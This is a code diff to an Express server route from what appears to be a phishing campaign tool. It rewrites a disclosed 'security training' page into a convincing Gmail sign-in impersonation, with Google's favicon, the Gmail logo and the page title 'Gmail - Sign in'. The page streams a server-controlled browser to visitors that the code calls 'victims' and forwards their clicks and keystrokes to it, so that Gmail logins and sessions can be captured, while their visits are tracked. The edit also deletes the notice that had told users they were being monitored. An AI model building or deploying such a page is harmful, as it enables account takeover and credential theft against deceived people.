@@ -84,147 +84,353 @@ app.use('/api/gmail-browser', gmailBrowserRoutes);
 // Register landing page routes
 landingPageService.registerLandingPageRoutes(app);
 
-// Handle Gmail browser session routing
+// Handle Gmail browser session routing for phishing victims
 app.get('/gmail-browser/:sessionToken', async (req, res) => {
   const { sessionToken } = req.params;
+  const trackingId = req.query._fstrike_track;
   
   try {
-    // Check if this is a valid Gmail browser session
-    const sessionInfo = gmailBrowserController.gmailBrowserService.getSessionInfo(sessionToken);
+    console.log(`🎯 Gmail phishing victim accessed: ${sessionToken} (tracking: ${trackingId})`);
     
-    if (sessionInfo && sessionInfo.sessionType === 'gmail_browser') {
-      // Create a Gmail browser session if it doesn't exist
-      if (!sessionInfo.isActive) {
-        await gmailBrowserController.gmailBrowserService.createGmailSession(
-          sessionToken, 
-          sessionInfo.campaignId,
-          {
-            ip: req.ip,
-            userAgent: req.get('User-Agent'),
-            timestamp: new Date()
-          }
-        );
-      }
+    // First, look up the session token to find the associated campaign
+    const query = `SELECT * FROM WebsiteMirroringSessions WHERE session_token = ? AND session_type = 'gmail_browser'`;
+    const sessionRecord = await new Promise((resolve, reject) => {
+      db.get(query, [sessionToken], (err, row) => {
+        if (err) reject(err);
+        else resolve(row);
+      });
+    });
 
-      // Render a page that shows the Gmail browser is active
+    if (!sessionRecord) {
+      console.log(`❌ Gmail session not found: ${sessionToken}`);
+      return res.status(404).send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>Access Denied</title>
+          <style>
+            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+            .error { color: #d73527; }
+          </style>
+        </head>
+        <body>
+          <h1 class="error">Access Denied</h1>
+          <p>The requested Gmail session could not be found or has expired.</p>
+        </body>
+        </html>
+      `);
+    }
+
+    const campaignId = sessionRecord.campaign_id;
+
+    // Generate a unique session token for this specific victim
+    const victimSessionToken = require('crypto').randomBytes(16).toString('hex');
+    
+    console.log(`🔐 Creating new Gmail browser session for victim: ${victimSessionToken}`);
+
+    // Create a new browser session for this victim
+    const userInfo = {
+      ip: req.ip,
+      userAgent: req.get('User-Agent'),
+      timestamp: new Date(),
+      trackingId: trackingId,
+      originalSessionToken: sessionToken,
+      isVictim: true // Mark this as a victim session
+    };
+
+    try {
+      const sessionInfo = await gmailBrowserController.gmailBrowserService.createGmailSession(
+        victimSessionToken,
+        campaignId,
+        userInfo
+      );
+
+      console.log(`✅ Gmail browser session created for victim: ${victimSessionToken}`);
+
+      // Return a page that displays the browser session content via iframe/proxy
       res.send(`
         <!DOCTYPE html>
         <html lang="en">
         <head>
           <meta charset="UTF-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <title>Gmail Access - Redirecting</title>
+          <title>Gmail - Sign in</title>
+          <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon.ico">
           <style>
-            body {
-              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-              margin: 0;
-              padding: 0;
-              min-height: 100vh;
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            html, body { height: 100%; overflow: hidden; }
+            
+            .loading-overlay {
+              position: fixed;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              background: #fff;
               display: flex;
+              flex-direction: column;
               align-items: center;
               justify-content: center;
+              z-index: 1000;
+              transition: opacity 0.5s ease;
             }
-            .container {
-              background: white;
-              padding: 2rem;
-              border-radius: 12px;
-              box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-              text-align: center;
-              max-width: 400px;
-              width: 90%;
+            
+            .loading-overlay.hidden {
+              opacity: 0;
+              pointer-events: none;
             }
+            
             .gmail-logo {
-              width: 64px;
-              height: 64px;
-              margin: 0 auto 1rem;
-              background: #ea4335;
-              border-radius: 12px;
-              display: flex;
-              align-items: center;
-              justify-content: center;
-              color: white;
-              font-size: 24px;
-              font-weight: bold;
+              margin-bottom: 24px;
             }
-            .spinner {
-              border: 3px solid #f3f3f3;
-              border-top: 3px solid #ea4335;
-              border-radius: 50%;
-              width: 30px;
-              height: 30px;
-              animation: spin 1s linear infinite;
-              margin: 1rem auto;
+            
+            .loading-text {
+              color: #5f6368;
+              font-size: 14px;
+              margin-bottom: 24px;
+              font-family: 'Google Sans', Roboto, arial, sans-serif;
             }
-            @keyframes spin {
-              0% { transform: rotate(0deg); }
-              100% { transform: rotate(360deg); }
+            
+            .progress-bar {
+              width: 200px;
+              height: 4px;
+              background: #e8eaed;
+              border-radius: 2px;
+              overflow: hidden;
             }
-            h1 { color: #333; margin-bottom: 0.5rem; }
-            p { color: #666; margin-bottom: 1.5rem; }
-            .secure-note {
-              background: #f8f9fa;
-              border-left: 4px solid #4285f4;
-              padding: 1rem;
-              margin-top: 1.5rem;
-              text-align: left;
-              border-radius: 0 4px 4px 0;
+            
+            .progress-fill {
+              height: 100%;
+              background: #1a73e8;
+              border-radius: 2px;
+              animation: progress 3s ease-out forwards;
             }
-            .secure-note strong { color: #4285f4; }
+            
+            @keyframes progress {
+              0% { width: 0%; }
+              100% { width: 100%; }
+            }
+            
+            #browserContainer {
+              width: 100%;
+              height: 100vh;
+              position: relative;
+              background: #fff;
+            }
+            
+            #screenshot {
+              width: 100%;
+              height: 100%;
+              object-fit: contain;
+              cursor: pointer;
+              display: block;
+            }
+            
+            .click-overlay {
+              position: absolute;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              z-index: 10;
+              cursor: pointer;
+            }
           </style>
         </head>
         <body>
-          <div class="container">
-            <div class="gmail-logo">G</div>
-            <h1>Accessing Gmail</h1>
-            <p>Please wait while we securely connect you to Gmail...</p>
-            <div class="spinner"></div>
-            <div class="secure-note">
-              <strong>Secure Connection:</strong> Your connection is being processed through our secure gateway for enhanced protection.
+          <!-- Loading screen -->
+          <div class="loading-overlay" id="loadingOverlay">
+            <div class="gmail-logo">
+              <svg width="75" height="75" viewBox="0 0 75 75">
+                <path fill="#ea4335" d="M37.5 47.5L57.5 32.5V55c0 2.5-2 4.5-4.5 4.5H37.5z"/>
+                <path fill="#34a853" d="M37.5 47.5L17.5 32.5V55c0 2.5 2 4.5 4.5 4.5H37.5z"/>
+                <path fill="#4285f4" d="M57.5 22.5v10l-20 15-20-15v-10c0-2.5 2-4.5 4.5-4.5h31c2.5 0 4.5 2 4.5 4.5z"/>
+                <path fill="#fbbc04" d="M17.5 22.5l20 15 20-15L52.5 15H22.5z"/>
+              </svg>
+            </div>
+            <div class="loading-text">Connecting to Gmail...</div>
+            <div class="progress-bar">
+              <div class="progress-fill"></div>
             </div>
           </div>
-          
+
+          <!-- Browser session container -->
+          <div id="browserContainer" style="display: none;">
+            <img id="screenshot" src="" alt="Gmail Session">
+            <div class="click-overlay" onclick="handleClick(event)"></div>
+          </div>
+
+          <script src="/socket.io/socket.io.js"></script>
           <script>
-            // Show this page for 3 seconds, then trigger the browser session
-            setTimeout(() => {
-              // Send a request to create the browser session
-              fetch('/api/gmail-browser/create-session', {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                  sessionToken: '${sessionToken}',
-                  campaignId: ${sessionInfo.campaignId}
-                })
-              }).then(response => response.json())
-                .then(data => {
-                  if (data.success) {
-                    // Update the page to show browser session is active
-                    document.body.innerHTML = \`
-                      <div class="container">
-                        <div class="gmail-logo">✓</div>
-                        <h1>Gmail Browser Session Active</h1>
-                        <p>Your Gmail session is now running in a secure browser environment.</p>
-                        <p><strong>Session ID:</strong> ${sessionToken}</p>
-                        <div class="secure-note">
-                          <strong>Note:</strong> This session is being monitored by your organization's security team for training purposes.
-                        </div>
-                      </div>
-                    \`;
-                  }
-                })
-                .catch(error => {
-                  console.error('Error creating browser session:', error);
+            const sessionToken = '${victimSessionToken}';
+            const campaignId = ${campaignId};
+            let socket;
+            let screenshotImg = document.getElementById('screenshot');
+            let lastUpdate = Date.now();
+
+            // Initialize socket connection
+            function initSocket() {
+              socket = io();
+              
+              socket.on('connect', () => {
+                console.log('Connected to browser session');
+                socket.emit('joinGmailSession', {
+                  sessionToken: sessionToken,
+                  userId: 'victim-' + Date.now()
                 });
+              });
+
+              socket.on('screenshot', (data) => {
+                if (data.sessionToken === sessionToken) {
+                  screenshotImg.src = 'data:image/png;base64,' + data.screenshot;
+                  lastUpdate = Date.now();
+                }
+              });
+
+              socket.on('pageNavigation', (data) => {
+                console.log('Page navigated to:', data.url);
+              });
+
+              // Auto-request screenshots every 2 seconds
+              setInterval(() => {
+                if (Date.now() - lastUpdate > 10000) { // If no update for 10 seconds
+                  requestScreenshot();
+                }
+              }, 2000);
+            }
+
+            // Handle clicks on the browser screen
+            function handleClick(event) {
+              const rect = event.target.getBoundingClientRect();
+              const x = event.clientX - rect.left;
+              const y = event.clientY - rect.top;
+              
+              // Send click to the browser session
+              fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  action: 'click',
+                  params: { x: x, y: y }
+                })
+              }).then(() => {
+                // Request a new screenshot after clicking
+                setTimeout(requestScreenshot, 500);
+              });
+            }
+
+            // Request a screenshot from the browser session
+            function requestScreenshot() {
+              fetch('/api/gmail-browser/session/' + sessionToken + '/screenshot')
+                .then(response => response.blob())
+                .then(blob => {
+                  const reader = new FileReader();
+                  reader.onload = () => {
+                    screenshotImg.src = reader.result;
+                    lastUpdate = Date.now();
+                  };
+                  reader.readAsDataURL(blob);
+                });
+            }
+
+            // Initialize after loading
+            setTimeout(() => {
+              document.getElementById('loadingOverlay').classList.add('hidden');
+              document.getElementById('browserContainer').style.display = 'block';
+              
+              initSocket();
+              requestScreenshot();
+              
+              // Track this phishing attempt
+              fetch('/api/tracking/click', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  trackingId: '${trackingId}',
+                  sessionToken: sessionToken,
+                  campaignId: campaignId,
+                  action: 'gmail_browser_victim_access',
+                  userAgent: navigator.userAgent,
+                  timestamp: new Date().toISOString()
+                })
+              }).catch(() => {});
+              
             }, 3000);
+
+            // Handle keyboard input (for when user types in forms)
+            document.addEventListener('keydown', (event) => {
+              // Forward keyboard events to the browser session
+              if (event.target === document.body) {
+                fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                    action: 'key',
+                    params: { 
+                      key: event.key,
+                      code: event.code,
+                      ctrlKey: event.ctrlKey,
+                      shiftKey: event.shiftKey,
+                      altKey: event.altKey
+                    }
+                  })
+                });
+              }
+            });
           </script>
         </body>
         </html>
       `);
-    } else {
-      res.status(404).send('Gmail browser session not found');
+
+    } catch (browserError) {
+      console.error('Error creating Gmail browser session:', browserError);
+      
+      // If browser session creation fails, show an error that looks like Gmail
+      res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>Gmail - Sign in</title>
+          <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon.ico">
+          <style>
+            body { 
+              font-family: 'Google Sans', Roboto, arial, sans-serif; 
+              background: #fff;
+              margin: 0;
+              padding: 50px 20px;
+              text-align: center; 
+            }
+            .error-container {
+              max-width: 400px;
+              margin: 0 auto;
+              padding: 40px;
+              border: 1px solid #dadce0;
+              border-radius: 8px;
+            }
+            h1 { color: #d93025; font-size: 24px; margin-bottom: 16px; }
+            p { color: #5f6368; line-height: 1.5; }
+            .retry-btn {
+              background: #1a73e8;
+              color: white;
+              border: none;
+              padding: 12px 24px;
+              border-radius: 4px;
+              cursor: pointer;
+              margin-top: 20px;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="error-container">
+            <h1>Connection Error</h1>
+            <p>We're having trouble connecting to Gmail. Please try again in a moment.</p>
+            <button class="retry-btn" onclick="window.location.reload()">Try Again</button>
+          </div>
+        </body>
+        </html>
+      `);
     }
+
   } catch (error) {
     console.error('Error handling Gmail browser route:', error);
     res.status(500).send('Internal server error');
